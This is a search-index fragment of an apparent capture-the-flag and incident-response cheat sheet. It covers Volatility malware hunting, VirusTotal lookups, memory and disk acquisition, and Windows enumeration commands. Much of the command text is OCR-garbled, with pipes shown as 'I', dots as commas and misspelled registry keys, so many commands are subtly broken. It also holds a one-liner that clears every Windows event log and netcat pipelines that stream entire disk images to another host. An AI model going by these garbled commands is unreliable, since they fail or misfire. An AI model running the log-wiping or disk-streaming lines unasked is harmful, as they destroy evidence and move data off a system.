vol.py -f <MEMORY DUMP FILE NAME>.raw -profile=Win7SPFix64 malfind -D /<OUTPUT DUMPDIRECTORY>","title":"Find Malware in memory dump using Volatility and Windows7SPFix64 profile:"},{"location":"capturetheflag/basic/analysis/malware/#find-malware-with-pid-in-memory-dump-usingvolatility","text":"python vol.py -f <MEMORY DUMP FILE NAME>.raw -profile=Win7SPFix64 malfind -p <PID #> -D /<OUTPUTDUMP DIRECTORY>","title":"Find Malware with PID in memory dump usingVolatility:"},{"location":"capturetheflag/basic/analysis/malware/#find-suspicious-processes-using-volatility","text":"python vol.py -f <MEMORY DUMP FILE NAME>.raw -profile=Win7SPFix64 pslist python vol.py -f <MEMORY DUMP FILE NAME>,raw -profile=Win7SPFix64 pstree","title":"Find suspicious processes using Volatility:"},{"location":"capturetheflag/basic/analysis/malware/#find-suspicious-dlls-using-volatility","text":"python vol.py -f <MEMORY DUMP FILE NAME>.raw -profile=Win7SPFix64 dlllist python vol.py -f <MEMORY DUMP FILE NAME>.raw -profile=Win7SPFix64 dlldump -D /<OUTPUT DUMPDIRECTORY>","title":"Find suspicious dlls using Volatility:"},{"location":"capturetheflag/basic/analysis/malware/#malware-analysis-parsing-tool","text":"Ref. https://github.com/Defense-Cyber-CrimeCenter/DC3-MWCP","title":"Malware analysis parsing Tool:"},{"location":"capturetheflag/basic/analysis/malware/#install-dc3-mwcp-tool","text":"# setup.py install Use dc3-mwcp tool to parse suspicious file: # mwcp-tool.py -p <SUSPICIOUS FILE NAME>","title":"Install dc3-mwcp tool:"},{"location":"capturetheflag/basic/analysis/malware/#process-explorer","text":"","title":"PROCESS EXPLORER"},{"location":"capturetheflag/basic/analysis/malware/#step-1-look-at-running-processes-by-running-process-explorer-gui-and-identify-potential-indicators-of-compromise","text":"* Items with no icon * Items with no description or company name * Unsigned Microsoft images (First add Verified Signer column under View tab->Select Columns, then go to Options tab and choose Verify Image Signatures) * Check all running process hashes in Virus Total (Go to Options tab and select Check VirusTota l. com) * Suspicious files are in Windows directories or user profile * Purple items that are packed or compressed * Items with open TCP/IP endpoints","title":"Step 1: Look at running processes by running Process Explorer (GUI) and identify potential indicators of compromise:"},{"location":"capturetheflag/basic/analysis/malware/#step-2-signature-file-check","text":"( See Sigcheck)","title":"Step 2: Signature File Check:"},{"location":"capturetheflag/basic/analysis/malware/#step-3-strings-check","text":"\u2022 Right click on suspicious process in Process Explorer and on pop up window choose Strings tab and review for suspicious URLs. Repeat for Image and Memory radio buttons. \u2022 Look for strange URLs in strings","title":"Step 3: Strings Check:"},{"location":"capturetheflag/basic/analysis/malware/#step-4-dll-view","text":"\u2022 Pop open with Ct rl+D \u2022 Look for suspicious DLLs or services \u2022 Look for no description or no company name \u2022 Look at VirusTotal Results column","title":"Step 4: DLL View:"},{"location":"capturetheflag/basic/analysis/malware/#step-5-stop-and-remove-malware","text":"\u2022 Right click and select Suspend for any identified suspicious processes \u2022 Right click and select Terminate Previous Suspended processes","title":"Step 5: Stop and Remove Malware:"},{"location":"capturetheflag/basic/analysis/malware/#step-6-clean-up-where-malicious-files-auto-start-on-reboot","text":"\u2022 Launch Autoruns \u2022 Under Options, Check the boxes Verify Code Signatures and Hide Microsoft entries \u2022 Look for suspicious process file from earlier steps on the everything tab and uncheck. Safer to uncheck than delete, in case of error. \u2022 Press FS, to refresh Autoruns, and confirm malicious file has not recreated the malicious entry into the previous unchecked auto start location.","title":"Step 6: Clean up where malicious files Auto start on reboot."},{"location":"capturetheflag/basic/analysis/malware/#step-7-process-monitor","text":"https://technet.microsoft.com/enus/sysinternals/processmonitor.aspx \u2022 If malicious activity is still persistent, run Process Monitor. \u2022 Look for newly started process that start soon after terminated from previous steps.","title":"Step 7: Process Monitor"},{"location":"capturetheflag/basic/analysis/malware/#step-8-repeat-as-needed-to-find-all-malicious-files-and-process-andor-combine-with-other-tools-and-suites","text":"","title":"Step 8: Repeat as needed to find all malicious files and process and/or combine with other tools and suites."},{"location":"capturetheflag/basic/analysis/malware/#file-hash-analysis","text":"","title":"FILE HASH ANALYSIS"},{"location":"capturetheflag/basic/analysis/malware/#hash-query","text":"","title":"HASH QUERY"},{"location":"capturetheflag/basic/analysis/malware/#virustotal-online-api-query","text":"![Ref](https://www.virustotal.com/en/documentation/publicapi/) (Prerequisite: Need a VT API Key)","title":"VirusTotal online API query:"},{"location":"capturetheflag/basic/analysis/malware/#send-a-suspicious-hash-to-virtustotal-using-curl","text":"curl -v --request POST --url https://www.virustotal.com/vtapi/v2/file/report' -d apikey=<VT API KEY> -d 'resource=<SUSPICIOUS FILEHASH>'","title":"Send a suspicious hash to VirtusTotal using cURL:"},{"location":"capturetheflag/basic/analysis/malware/#send-a-suspicious-file-to-virustotal-using-curl","text":"# curl -v -F 'file=/<PATH TO FILE>/<SUSPICIOUS FILENAME>' -F apikey=<VT API KEY> https://www.virustotal.com/vtapi/v2/file/scan","title":"Send a suspicious file to VirusTotal using cURL:"},{"location":"capturetheflag/basic/analysis/malware/#team-cymru-api","text":"Ref. https://hash.cymru.com, http://totalhash.com Team Cymru malware hash lookup using whois: (Note: Output is timestamp of last seen and detection rate) # whois -h hash,cymru.com <SUSPICIOUS FILE HASH>","title":"Team Cymru API:"},{"location":"capturetheflag/basic/analysis/malware/#hard-drive-and-memory-acquisition","text":"","title":"HARD DRIVE AND MEMORY ACQUISITION"},{"location":"capturetheflag/basic/analysis/malware/#windows","text":"","title":"WINDOWS"},{"location":"capturetheflag/basic/analysis/malware/#create-memory-dump-remotely","text":"Ref. http://kromer.pl/malware-analysis/memoryforensics-using-volatility-toolkit-to-extractmalware-samples-from-memory-dump/ Ref. http://sourceforge.net/projects/mdd/ Ref. https://technet.microsoft.com/enus/sysinternals/psexec.aspx C: \\> psexec. exe \\\\<HOST NAME OR IP ADDRESS> -u <DOMAIN>\\<PRIVILEGED ACCOUNT> -p <PASSWORD> -cmdd_l,3.exe --o C:\\memory.dmp Ref.https://github.com/volatilityfoundation/volatility","title":"Create memory dump remotely:"},{"location":"capturetheflag/basic/analysis/malware/#extract-exedll-from-memory-dump","text":"C:\\> volatility dlldump -f memory.dmp -0 dumps/ C:\\> volatility procmemdump -f memory.dmp -0 dumps/","title":"Extract exe/dll from memory dump:"},{"location":"capturetheflag/basic/analysis/malware/#create-hard-drive-image-using-dc3dd-of-c58","text":"Ref.https://sourceforge.net/projects/dc3dd/files/dc3dd/7.2%20-%20Windows/ C:\\> dc3dd,exe if=\\\\,\\c: of=d:\\<ATTACHED OR TARGETDRIVE>\\<IMAGE NAME>,dd hash=md5 log=d:\\<MOUNTEDLOCATION>\\<LOG NAME>, log","title":"Create hard drive image using dc3dd of C::"},{"location":"capturetheflag/basic/analysis/malware/#linux","text":"","title":"LINUX"},{"location":"capturetheflag/basic/analysis/malware/#create-memory-dump","text":"dd if=/dev/fmem of=/tmp/<MEMORY FILE NAME>.dd","title":"Create memory dump:"},{"location":"capturetheflag/basic/analysis/malware/#create-memory-dump-using-lime","text":"Ref. https://github.com/504ensicslabs/lime wgethttps://github.com/504ensicslabs/LiME/archive/master.zip unzip master.zip cd LiME-master/src make p lime-*,ko /media/=/media/ExternalUSBDriveName/ insmod lime-3.13.0-79-generic.ko \"path=/media/Exte rna lUSBDriveName/<MEMORY DUMP>, limeformat=raw\"","title":"Create memory dump using LiME:"},{"location":"capturetheflag/basic/analysis/malware/#make-copy-of-suspicious-process-using-process-id","text":"cp /proc/<SUSPICIOUS PROCESS ID>/exe /<NEW SAVEDLOCATION>","title":"Make copy of suspicious process using process ID:"},{"location":"capturetheflag/basic/analysis/malware/#grab-memory-core-dump-of-suspicious-process","text":"gcore <PIO>","title":"Grab memory core dump of suspicious process:"},{"location":"capturetheflag/basic/analysis/malware/#strings-on-gcore-file","text":"# strings gcore.*","title":"Strings on gcore file:"},{"location":"capturetheflag/basic/analysis/malware/#create-a-hard-drivepartition-copy-with-tog-and-hash-options","text":"dd if=<INPUT DEVICE> of=<IMAGE FILE NAME> dc3dd if=/dev/<TARGET DRIVE EXAMPLE SDA OR SDAl> of=/dev/<MOUNTED LOCATION>\\<FILE NAME>.img hash=md5 log=/<MOUNTED LOCATION>/<LOG NAME>.log","title":"Create a hard drive/partition copy with tog and hash options:"},{"location":"capturetheflag/basic/analysis/malware/#create-a-remote-hard-drivepartition-over-ssh","text":"dd if=/dev/<INPUT DEVICE> I ssh <USERNAME>@<DESTINATION IP ADDRESS> \"dd of=<DESTINATIONPATH>\"","title":"Create a remote hard drive/partition over SSH:"},{"location":"capturetheflag/basic/analysis/malware/#send-hard-drive-image-zipped-over-netcat","text":"","title":"Send hard drive image zipped over netcat:"},{"location":"capturetheflag/basic/analysis/malware/#sending-host","text":"bzip2 -c /dev/<INPUT DEVICE> I nc <DESTINATION IPADDRESS> <PICK A PORT>","title":"Sending host:"},{"location":"capturetheflag/basic/analysis/malware/#receiving-host","text":"nc -p <PICK SAME PORT> -l lbzip2 -d I dd of=/dev/sdb","title":"Receiving host:"},{"location":"capturetheflag/basic/analysis/malware/#send-hard-drive-image-over-netcat","text":"","title":"Send hard drive image over netcat:"},{"location":"capturetheflag/basic/analysis/malware/#sending-host_1","text":"dd if=/dev/<INPUT DEVICE> bs=16M I nc <PORT>","title":"Sending host:"},{"location":"capturetheflag/basic/analysis/malware/#receiving-host-with-pipe-viewer-meter","text":"nc -p <SAME PORT> -l -vv I pv -r I dd of=/dev/<INPUT DEVICE> bs=16M","title":"Receiving host with Pipe Viewer meter:"},{"location":"capturetheflag/basic/analysis/windows/","text":"SYSTEM INFORMATION C:\\> echo %DATE% %TIME% C:\\> hostname C:\\> systeminfo C:\\> systeminfo I findstr /B /C:\"OS Name\" /C:\"OSVersion\" C:\\> wmic csproduct get name C:\\> wmic bios get serialnumber C:\\> wmic computersystem list brief https://technet.microsoft.com/enus/sysinternals/psinfo.aspx C:\\> psinfo -accepteula -s -h -d USER INFORMATION C:\\> whoami C:\\> net users C:\\> net localgroup administrators C:\\> net group administrators C:\\> wmic rdtoggle list C:\\> wmic useraccount list C:\\> wmic group list C:\\> wmic netlogin getname, lastlogon,badpasswordcount C:\\> wmic netclient list brief C:\\> doskey /history> history.txt NETWORK INFORMATION C:\\> netstat -e C:\\> netstat -naob C:\\> netstat -nr C:\\> netstat -vb C:\\> nbtstat -s C:\\> route print C:\\> arp -a C:\\> ipconfig /displaydns C:\\> netsh winhttp show proxy C:\\> ipconfig /allcompartments /all C:\\> netsh wlan show interfaces C:\\> netsh wlan show all C:\\> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections\\WinHttpSettings\" C:\\> type %SYSTEMROOT%\\system32\\drivers\\etc\\hosts C:\\> wmic nicconfig getdescriptions,IPaddress,MACaddress C:\\> wmic netuse getname,username,connectiontype, localname SERVICE INFORMATION C:\\> at C:\\> tasklist C:\\> task list /SVC C:\\> tasklist /SVC /fi \"imagename eq svchost.exe\" C:\\> schtasks C:\\> net start C:\\> sc query C:\\> wmic service list brief C:\\> wmic service list conf ig C:\\> wmic process list brief C:\\> wmic process list status C:\\> wmic process list memory C:\\> wmic job list brief I findstr \"Running\" PS C:\\> Get-Service I Where-Object { $_.Status -eq\"running\" } List of all processes and then all loaded modules: PS C:\\> Get-Process !select modules!ForeachObject{$_.modules} POLICY, PATCH AND SETTINGS INFORMATION C:\\> set C:\\> gpresult /r C:\\> gpresult /z > <OUTPUT FILE NAME>.txt C:\\> gpresult /H report.html /F C:\\> wmic qfe List GPO software installed: C:\\> reg query uHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\AppMgmt\" AUTORUN AND AUTOLOAD INFORMATION Startup information: C:\\> wmic startup list full C:\\> wmic ntdomain list brief View directory contents of startup folder: C:\\> dir \"%SystemDrive%\\ProgramData\\Microsoft\\Windows\\StartMenu\\P rog rams\\Sta rtup\" C:\\> dir \"%SystemDrive%\\Documents and Settings\\All Use rs\\Sta rt Menu\\Prog rams\\Sta rtup\" C:\\> dir %userprofile%\\Start Menu\\Programs\\Startup C:\\> %ProgramFiles%\\Startup\\ C:\\> dir C:\\Windows\\Start Menu\\Programs\\startup C:\\> dir \"C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" C:\\> dir \"C:\\ProgramData\\Microsoft\\Windows\\StartMenu\\P rog rams\\Sta rtup\" C:\\> dir \"%APPDATA%\\Microsoft\\Windows\\StartMenu\\Prog rams\\Sta rtup\" C:\\> dir \"%ALLUSERSPROFILE%\\Microsoft\\Windows\\StartMenu\\Prog rams\\Sta rtup\" C:\\> dir \"%ALLUSERSPROFILE%\\StartMenu\\P rog rams\\Sta rtup\" C:\\> type C:\\Windows\\winstart.bat C:\\> type %windir%\\wininit.ini C:\\> type %windir%\\win.ini View autoruns, hide Microsoft files: https://technet.microsoft.com/enus/sysinternals/bb963902.aspx C:\\> autorunsc -accepteula -m C:\\> type C:\\Autoexec.bat\" Show all autorun files, export to csv and check withVirusTotal: C:\\> autorunsc.exe -accepteula -a -c -i -e -f -l -m -v HKEY_CLASSES_ROOT: C:\\> reg query HKCR\\Comfile\\Shell\\Open\\Command C:\\> reg query HKCR\\Batfile\\Shell\\Open\\Command C:\\> reg query HKCR\\htafile\\Shell\\Open\\Command C:\\> reg query HKCR\\Exefile\\Shell\\Open\\Command C:\\> reg query HKCR\\Exefiles\\Shell\\Open\\Command C:\\> reg query HKCR\\piffile\\shell\\open\\command HKEY_CURRENT_USERS: C:\\> reg query uHKCU\\Control Panel\\Desktop\" C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Runonce C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServ ices Once C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Windows\\Run C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Windows\\Load C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Windows\\Scripts C:\\> reg query HKCU\\Software\\Microsoft\\WindowsNT\\CurrentVersion\\Windows /f run C:\\> reg query HKCU\\Software\\Microsoft\\WindowsNT\\CurrentVersion\\Windows\u00ab /f load C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\LastVisitedMRU C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComD1g32\\0pen5aveMRU C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\LastVisitedPidlMRU C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComD1g32\\0pen5avePidlMRU /s C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders C:\\> reg query uHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Applets\\RegEdit /v LastKey C:\\> reg query HKCU\\Software\\Microsoft\\InternetExp lo re r\\ TypedURLs C:\\> reg query uHKCU\\Software\\Policies\\Microsoft\\Windows\\ControlPanel \\Desktop\" HKEY_LOCAL_MACHINE: C:\\> reg query HKLM\\SOFTWARE\\Mic rosoft\\Act ive Setup\\Installed Components /s C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\explorer\\User Shell Folders C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\explorer\\Shell Folders C:\\> reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\explorer\\ShellExecuteHooks C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Browser Helper Objects /s C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Runonce C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServices C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Winlogon\\Userinit C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\shellServiceObjectDelayLoad C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Schedule\\TaskCache\\Tasks /s C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Windows C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Windows /f Appinit_DLLs C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Winlogon /f Shell C:\\> reg query HKLM\\SOFTWARE\\Mic rosoft\\WindowsNT\\CurrentVersion\\Winlogon /f Userinit C:\\> reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Systern\\Scripts C:\\> reg query HKLM\\SOFTWARE\\Classes\\batfile\\shell\\open\\cornrnand C:\\> reg query HKLM\\SOFTWARE\\Classes\\cornfile\\shell\\open\\cornrnand C:\\> reg query HKLM\\SOFTWARE\\Classes\\exefile\\shell\\open\\command C:\\> reg query HKLM\\SOFTWARE\\Classes\\htafile\\Shell\\Open\\Command C:\\> reg query HKLM\\SOFTWARE\\Classes\\piffile\\shell\\open\\command C:\\> reg query HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Browser Helper Objects /s C:\\> reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SessionManager C:\\> reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SessionManager\\KnownDLLs C:\\> reg query HKLM\\SYSTEM\\ControlSet001\\Control\\SessionManager\\KnownDLLs LOGS Copy event logs: C:\\> wevtutil epl Security C:\\<BACK UPPATH>\\mylogs.evtx C:\\> wevtutil epl System C:\\<BACK UPPATH>\\mylogs.evtx C:\\> wevtutil epl Application C:\\<BACK UPPATH>\\mylogs.evtx Get list of logs remotely: https://technet.microsoft.com C:\\> psloglist \\\\<REMOTE COMPUTER> -accepteula -h 12 -x Clear all logs and start a baseline log to monitor: PS C:\\> wevtutil el I Foreach-Object {wevtutil cl\"$_\"} List log filenames and path location: C:\\> wmic nteventlog get path,filename,writeable Take pre breach log export: PS C:\\> wevtutil el I ForEach-Object{Get-Eventlog -Log \"$_\" I Export-Csv -Path (:\\<BASELINE LOG>,csv -Append} Take post breach log export: PS C:\\> wevtutil el I ForEach-Object{Get-EventLog -Log\"$_\" I Export-Csv -Path C:\\<POST BASELINELOG>,CSV -Append} Compare two files baseline and post breach logs: PS C:\\> Compare-Object -ReferenceObject $(GetContent\"C:\\<PATH TO FILE>\\<ORIGINAL BASELINELOGS>.txt\") -DifferenceObject $(Get-Content\"C:\\<PATH TO FILE>\\<POST BASELINE LOGS>.txt\") >><DIFFERENCES LOG>.txt This deletes all logs: PS C:\\> wevtutil el I Foreach-Object {wevtutil cl\"$_\"} FILES, DRIVES AND SHARES INFORMATION C:\\> net use \\\\<TARGET IP ADDRESS> C:\\> net share C:\\> net session C:\\> wmic volume list brief C:\\> wmic logicaldisk getdescription,filesystem,name,size C:\\> wmic share get name,path Find multiple file types or a file: C:\\> dir /A /5 /T:A *,exe *,dll *,bat *\u00b7PS1 *,zip C:\\> dir /A /5 /T:A <BAD FILE NAME>,exe Find executable (.exe) files newer than Jan 1, 2017: C:\\> forfiles /p C:\\ /M *,exe /5 /0 +1/1/2017 /C\"cmd /c echo @fdate @ftime @path\" Find multiple files types using loop: C:\\> for %G in (.exe, .dll, .bat, .ps) do forfiles -p \"C:\" -m *%G -s -d +1/1/2017 -c \"cmd /c echo @fdate@ftime @path\" Search for files newer than date: C:\\> forfiles /PC:\\ /5 /0 +1/01/2017 /C \"cmd /c echo @path @fdate\" Find large files: (example <20 MB) C:\\> forfiles /5 /M * /C \"cmd /c if @fsize GEO 2097152 echo @path @fsize\" Find files with Alternate Data Streams: https://technet.microsoft.com/enus/sysinternals/streams.aspx C:\\> streams -s <FILE OR DIRECTORY>Find files with bad signature into csv: https://technet.microsoft.com/enus/sysinternals/bb897441.aspx C:\\> sigcheck -c -h -s -u -nobanner <FILE OR DIRECTORY> > <OUTPUT FILENAME>,csv Find and show only unsigned files with bad signature in C: C:\\> sigcheck -e -u -vr -s C:\\ List loaded unsigned Dlls: https://technet.microsoft.com/enus/sysinternals/bb896656.aspx C:\\> listdlls.exe -u C:\\> listdlls.exe -u <PROCESS NAME OR PID> Run Malware scan (Windows Defender) offline: http://windows.microsoft.com/enus/windows/what-is-windows-defender-offline C:\\> MpCmdRun.exe -SignatureUpdate C:\\> MpCmdRun.exe -Scan","title":"windows"},{"location":"capturetheflag/basic/analysis/windows/#system-information","text":"C:\\> echo %DATE% %TIME% C:\\> hostname C:\\> systeminfo C:\\> systeminfo I findstr /B /C:\"OS Name\" /C:\"OSVersion\" C:\\> wmic csproduct get name C:\\> wmic bios get serialnumber C:\\> wmic computersystem list brief https://technet.microsoft.com/enus/sysinternals/psinfo.aspx C:\\> psinfo -accepteula -s -h -d","title":"SYSTEM INFORMATION"},{"location":"capturetheflag/basic/analysis/windows/#user-information","text":"C:\\> whoami C:\\> net users C:\\> net localgroup administrators C:\\> net group administrators C:\\> wmic rdtoggle list C:\\> wmic useraccount list C:\\> wmic group list C:\\> wmic netlogin getname, lastlogon,badpasswordcount C:\\> wmic netclient list brief C:\\> doskey /history> history.txt","title":"USER INFORMATION"},{"location":"capturetheflag/basic/analysis/windows/#network-information","text":"C:\\> netstat -e C:\\> netstat -naob C:\\> netstat -nr C:\\> netstat -vb C:\\> nbtstat -s C:\\> route print C:\\> arp -a C:\\> ipconfig /displaydns C:\\> netsh winhttp show proxy C:\\> ipconfig /allcompartments /all C:\\> netsh wlan show interfaces C:\\> netsh wlan show all C:\\> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections\\WinHttpSettings\" C:\\> type %SYSTEMROOT%\\system32\\drivers\\etc\\hosts C:\\> wmic nicconfig getdescriptions,IPaddress,MACaddress C:\\> wmic netuse getname,username,connectiontype, localname","title":"NETWORK INFORMATION"},{"location":"capturetheflag/basic/analysis/windows/#service-information","text":"C:\\> at C:\\> tasklist C:\\> task list /SVC C:\\> tasklist /SVC /fi \"imagename eq svchost.exe\" C:\\> schtasks C:\\> net start C:\\> sc query C:\\> wmic service list brief C:\\> wmic service list conf ig C:\\> wmic process list brief C:\\> wmic process list status C:\\> wmic process list memory C:\\> wmic job list brief","title":"SERVICE INFORMATION"},{"location":"capturetheflag/basic/analysis/windows/#i-findstr-running","text":"PS C:\\> Get-Service I Where-Object { $_.Status -eq\"running\" }","title":"I findstr \"Running\""},{"location":"capturetheflag/basic/analysis/windows/#list-of-all-processes-and-then-all-loaded-modules","text":"PS C:\\> Get-Process !select modules!ForeachObject{$_.modules}","title":"List of all processes and then all loaded modules:"},{"location":"capturetheflag/basic/analysis/windows/#policy-patch-and-settings-information","text":"C:\\> set C:\\> gpresult /r C:\\> gpresult /z > <OUTPUT FILE NAME>.txt C:\\> gpresult /H report.html /F C:\\> wmic qfe","title":"POLICY, PATCH AND SETTINGS INFORMATION"},{"location":"capturetheflag/basic/analysis/windows/#list-gpo-software-installed","text":"C:\\> reg query uHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\AppMgmt\"","title":"List GPO software installed:"},{"location":"capturetheflag/basic/analysis/windows/#autorun-and-autoload-information-startup-information","text":"C:\\> wmic startup list full C:\\> wmic ntdomain list brief","title":"AUTORUN AND AUTOLOAD INFORMATION Startup information:"},{"location":"capturetheflag/basic/analysis/windows/#view-directory-contents-of-startup-folder","text":"C:\\> dir \"%SystemDrive%\\ProgramData\\Microsoft\\Windows\\StartMenu\\P rog rams\\Sta rtup\" C:\\> dir \"%SystemDrive%\\Documents and Settings\\All Use rs\\Sta rt Menu\\Prog rams\\Sta rtup\" C:\\> dir %userprofile%\\Start Menu\\Programs\\Startup C:\\> %ProgramFiles%\\Startup\\ C:\\> dir C:\\Windows\\Start Menu\\Programs\\startup C:\\> dir \"C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" C:\\> dir \"C:\\ProgramData\\Microsoft\\Windows\\StartMenu\\P rog rams\\Sta rtup\" C:\\> dir \"%APPDATA%\\Microsoft\\Windows\\StartMenu\\Prog rams\\Sta rtup\" C:\\> dir \"%ALLUSERSPROFILE%\\Microsoft\\Windows\\StartMenu\\Prog rams\\Sta rtup\" C:\\> dir \"%ALLUSERSPROFILE%\\StartMenu\\P rog rams\\Sta rtup\" C:\\> type C:\\Windows\\winstart.bat C:\\> type %windir%\\wininit.ini C:\\> type %windir%\\win.ini","title":"View directory contents of startup folder:"},{"location":"capturetheflag/basic/analysis/windows/#view-autoruns-hide-microsoft-files","text":"https://technet.microsoft.com/enus/sysinternals/bb963902.aspx C:\\> autorunsc -accepteula -m C:\\> type C:\\Autoexec.bat\"","title":"View autoruns, hide Microsoft files:"},{"location":"capturetheflag/basic/analysis/windows/#show-all-autorun-files-export-to-csv-and-check-withvirustotal","text":"C:\\> autorunsc.exe -accepteula -a -c -i -e -f -l -m -v","title":"Show all autorun files, export to csv and check withVirusTotal:"},{"location":"capturetheflag/basic/analysis/windows/#hkey_classes_root","text":"C:\\> reg query HKCR\\Comfile\\Shell\\Open\\Command C:\\> reg query HKCR\\Batfile\\Shell\\Open\\Command C:\\> reg query HKCR\\htafile\\Shell\\Open\\Command C:\\> reg query HKCR\\Exefile\\Shell\\Open\\Command C:\\> reg query HKCR\\Exefiles\\Shell\\Open\\Command C:\\> reg query HKCR\\piffile\\shell\\open\\command","title":"HKEY_CLASSES_ROOT:"},{"location":"capturetheflag/basic/analysis/windows/#hkey_current_users","text":"C:\\> reg query uHKCU\\Control Panel\\Desktop\" C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Runonce C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServ ices Once C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Windows\\Run C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Windows\\Load C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Windows\\Scripts C:\\> reg query HKCU\\Software\\Microsoft\\WindowsNT\\CurrentVersion\\Windows /f run C:\\> reg query HKCU\\Software\\Microsoft\\WindowsNT\\CurrentVersion\\Windows\u00ab /f load C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\LastVisitedMRU C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComD1g32\\0pen5aveMRU C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\LastVisitedPidlMRU C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComD1g32\\0pen5avePidlMRU /s C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders C:\\> reg query uHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Applets\\RegEdit /v LastKey C:\\> reg query HKCU\\Software\\Microsoft\\InternetExp lo re r\\ TypedURLs C:\\> reg query uHKCU\\Software\\Policies\\Microsoft\\Windows\\ControlPanel \\Desktop\"","title":"HKEY_CURRENT_USERS:"},{"location":"capturetheflag/basic/analysis/windows/#hkey_local_machine","text":"C:\\> reg query HKLM\\SOFTWARE\\Mic rosoft\\Act ive Setup\\Installed Components /s C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\explorer\\User Shell Folders C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\explorer\\Shell Folders C:\\> reg query 